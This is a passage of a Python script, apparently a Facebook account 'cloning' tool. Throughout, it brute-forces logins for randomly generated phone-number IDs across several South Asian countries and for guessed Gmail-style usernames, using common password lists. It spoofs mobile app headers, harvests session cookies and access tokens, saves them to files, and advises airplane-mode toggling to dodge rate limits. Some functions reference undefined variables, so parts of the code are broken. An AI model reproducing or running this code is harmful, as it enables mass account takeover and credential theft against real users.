            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASIF-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/SANG-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M7 }──────────────#
def __file_M7__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SANG-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASIF-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/SANG-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M8 }──────────────#
def __file_M8__(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\r{A}|SANG-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Ahmed'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			Asifxd=session.cookies.get_dict().keys()
			if "c_user" in Asifxd:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
				print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
				open('/sdcard/SANG-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Asifxd:
				print(f'\r\r{R}|A x N_CP| '+ids+' | '+pas)
				open('/sdcard/SANG-M8-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#──────────────{ RANDOM }──────────────#
def __Randmx__():
	clear()
	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");print(f"{A}|3| NEPAL CLONING");print(f"{A}|4| PAKISTAN CLONING");print(f"{A}|5| AFGHANISTAN CLONING");linex();option = input(f'{A}|?| CHOICE : ')
	if option in ['A','1']:__bdx__()
	elif option in ['B','2']:__india__()
	elif option in ['C','3']:__nepalx__()
	elif option in ['D','4']:__pakistan__()
	elif option in ['E','5']:__afghanistanx__()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Sangam:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS Brand");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'bangladesh','506070','405060','102030','freefire','i love you','mahedi','708090','@@@###','@#@#@#']
            if methodx in ['1']:Sangam.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Sangam.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Sangam.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Sangam.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Sangam.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Sangam:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS Brand ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if methodx in ['1']:Sangam.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Sangam.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Sangam.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Sangam.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Sangam.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-NEPAL }──────────────#
def __nepalx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 9815 / 9840 / 9814 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Asifx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if methodx in ['1']:Sangam.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Sangam.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Sangam.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Sangam.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Sangam.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-PAKISTAN }──────────────#
def __pakistan__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 0306 / 0315 / 0345 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Asifx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if methodx in ['1']:SANGAM.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:SANGAM.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:SANGAM.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:SANGAM.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:SANGAM.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-AFGHANISTAN }──────────────#
def __afghanistanx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +9340 / +9350 / +9330 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Asifx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {918} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS sangam king ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ GMAIL }──────────────#
def __Gmailx__():
    clear()
    user=[]
    print(f"{A}|=| EXAMPLE : Habib/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
    clear()
    print(f"{A}|=| EXAMPLE : Hossain/Khan/Ali/Islam ");linex();last = input(f'{A}|?| LAST NAME  : ')
    period = '.'
    try:
        clear();print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Asifxxxx:
        total=str(len(user))
        clear()
        print(f'{A}|=| GMAIL UID : {total} ');print(f'{A}|=| FULL NAME : {first+last} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            Asifxxxx.submit(__GMAILX__,username,pswrd,total)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': fuckx(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M3 }──────────────#
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent':pro(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|A x N_OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ASIF-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|A x N_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ASIF-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M4 }──────────────#
def __Randm_M4__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ASIF-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'd.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
